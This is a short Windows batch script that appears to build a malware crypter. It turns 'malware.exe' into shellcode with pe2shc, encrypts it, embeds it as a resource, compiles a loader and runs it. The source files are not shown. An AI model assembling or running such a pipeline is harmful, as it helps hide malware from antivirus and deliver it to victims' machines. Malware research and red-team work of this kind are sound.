@echo off

echo pe to shellcode
pe2shc malware.exe malware.shc

echo compiling and running: encrypt.cpp
g++ encrypt.cpp -o encrypt
encrypt.exe malware.shc

echo compiling: resources.rc
windres resources.rc -o resources.o

echo compiling: main.cpp
g++ main.cpp resources.o -O3 -Os -o main

if %errorlevel% equ 0 (
    echo compilation successful. running main.exe.
    main.exe
) else (
    echo compilation failed.
)